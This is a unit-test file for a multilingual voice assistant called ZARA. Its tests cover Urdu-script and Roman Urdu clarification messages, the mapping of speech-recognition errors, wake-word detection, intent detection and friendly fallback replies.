test('Clarifications: replaces generic canned lines with helpful language-appropriate clarifications', async () => {
  const { getClarificationResponse } = await import('./languageDetector.ts');

  const urduUnclear = getClarificationResponse('urdu', 'unclear');
  const romanUnclear = getClarificationResponse('roman_urdu', 'unclear');
  const enUnclear = getClarificationResponse('english', 'unclear');

  // Ensure Urdu response is in genuine Urdu script
  assert.ok(/[\u0600-\u06FF]/.test(urduUnclear), 'Urdu clarification must be in Urdu script');
  assert.ok(urduUnclear.includes('باس'), 'Urdu clarification must address as Boss (باس)');

  // Ensure Roman Urdu is polite and helpful
  assert.ok(romanUnclear.includes('Boss'), 'Roman Urdu clarification must address as Boss');
  assert.ok(romanUnclear.toLowerCase().includes('dobara') || romanUnclear.toLowerCase().includes('wazahat'));

  // Ensure English clarification is natural and friendly
  assert.ok(enUnclear.includes('Boss'));

  // CRITICAL: Ensure NONE of them use the old banned canned phrase "kuch samajh nahi aaya, dobara bolo!"
  const bannedPhrase = 'kuch samajh nahi aaya, dobara bolo';
  assert.equal(urduUnclear.includes(bannedPhrase), false);
  assert.equal(romanUnclear.includes(bannedPhrase), false);
  assert.equal(enUnclear.includes(bannedPhrase), false);
});

test('Speech Recognition Error Mapping: maps permissions, network, and audio errors accurately', async () => {
  const { mapSpeechErrorToMessage } = await import('./languageDetector.ts');

  // Permission denied error
  const permError = mapSpeechErrorToMessage('not-allowed', 'roman_urdu');
  assert.equal(permError.isFatal, true);
  assert.ok(permError.friendlyMessage.toLowerCase().includes('permission') || permError.friendlyMessage.toLowerCase().includes('mic'));

  // Audio capture / hardware missing
  const audioError = mapSpeechErrorToMessage('audio-capture', 'urdu');
  assert.equal(audioError.isFatal, true);
  assert.ok(/[\u0600-\u06FF]/.test(audioError.friendlyMessage), 'Urdu error message must be in Urdu script');

  // Network error (transient, not fatal)
  const netError = mapSpeechErrorToMessage('network', 'english');
  assert.equal(netError.isFatal, false);
  assert.ok(netError.friendlyMessage.toLowerCase().includes('network'));

  // Normal background silence / no-speech (silent, non-fatal)
  const noSpeechError = mapSpeechErrorToMessage('no-speech', 'roman_urdu');
  assert.equal(noSpeechError.isFatal, false);
  assert.equal(noSpeechError.friendlyMessage, '');
});

test('Wake Word Detector: recognizes Urdu script wake words and extracts remainder text', async () => {
  const { detectWakeWord } = await import('./wakeWordDetector.ts');

  // Standalone Urdu script wake word
  const match1 = detectWakeWord('زارا');
  assert.equal(match1.detected, true);
  assert.equal(match1.phrase, 'زارا');

  // Urdu script Islamic greeting
  const match2 = detectWakeWord('السلام علیکم زارا');
  assert.equal(match2.detected, true);
  assert.equal(match2.isAssalamGreeting, true);

  // Urdu script with remainder query
  const match3 = detectWakeWord('زارا، ویب سائٹ بناؤ');
  assert.equal(match3.detected, true);
  assert.equal(match3.remainderText, 'ویب سائٹ بناؤ');

  // Urdu script hello
  const match4 = detectWakeWord('ہیلو زارا');
  assert.equal(match4.detected, true);
});

test('Intent Engine: processes Urdu script requests with authentic Urdu script responses', async () => {
  const { detectAdvancedIntent } = await import('./worldClassAiEngine.ts');

  // 1. E-Commerce creation in Urdu script
  const ecom = detectAdvancedIntent('ایک ای کامرس ویب سائٹ بناؤ');
  assert.equal(ecom.intent, 'software_engineering');
  assert.ok(/[\u0600-\u06FF]/.test(ecom.speechResponseRomanUrdu), 'Urdu response must be in Urdu script');
  assert.ok(ecom.artifact !== undefined);

  // 2. Generic website asking for clarification in Urdu script
  const webClar = detectAdvancedIntent('ویب سائٹ بناؤ');
  assert.equal(webClar.needsClarification, true);
  assert.equal(webClar.clarificationType, 'website_type');
  assert.ok(/[\u0600-\u06FF]/.test(webClar.speechResponseRomanUrdu));

  // 3. Logo clarification in Urdu script
  const logoClar = detectAdvancedIntent('لوگو بناؤ');
  assert.equal(logoClar.needsClarification, true);
  assert.equal(logoClar.clarificationType, 'logo_brand');
  assert.ok(/[\u0600-\u06FF]/.test(logoClar.speechResponseRomanUrdu));

  // 4. Logo with brand name in Urdu script
  const logoBrand = detectAdvancedIntent('Apex Tech کا لوگو');
  assert.equal(logoBrand.intent, 'creative_logo');
  assert.ok(logoBrand.topic.includes('Apex Tech'));
  assert.ok(/[\u0600-\u06FF]/.test(logoBrand.speechResponseRomanUrdu));

  // 5. App launch in Urdu script
  const appLaunch = detectAdvancedIntent('کروم کھولو');
  assert.equal(appLaunch.intent, 'app_launch');
  assert.equal(appLaunch.topic, 'Google Chrome');
  assert.ok(/[\u0600-\u06FF]/.test(appLaunch.speechResponseRomanUrdu));
});

test('Multilingual Contextual Fallback: returns authentic responses in the matching language', async () => {
  const { generateContextualDostanaFallback } = await import('./conversationFormatter.ts');

  // Urdu script greeting
  const urduGreeting = generateContextualDostanaFallback('السلام علیکم', false, 'urdu');
  assert.ok(/[\u0600-\u06FF]/.test(urduGreeting));
  assert.ok(urduGreeting.includes('وعلیکم السلام') || urduGreeting.includes('باس'));

  // Urdu script chai
  const urduChai = generateContextualDostanaFallback('چائے پی لی آپ نے؟', false, 'urdu');
  assert.ok(/[\u0600-\u06FF]/.test(urduChai));
  assert.ok(urduChai.includes('چائے'));

  // Roman Urdu chai
  const romanChai = generateContextualDostanaFallback('chai pi li Boss?', false, 'roman_urdu');
  assert.ok(romanChai.toLowerCase().includes('chai'));
  assert.ok(romanChai.includes('Boss'));

  // English greeting
  const enGreeting = generateContextualDostanaFallback('Hello ZARA', false, 'english');
  assert.ok(enGreeting.includes('Boss'));
  assert.ok(enGreeting.includes('today') || enGreeting.includes('going'));

  // Verify "Hukum karein" is NOT in any fallback
  assert.equal(urduGreeting.includes('Hukum karein'), false);
  assert.equal(romanChai.includes('Hukum karein'), false);
});













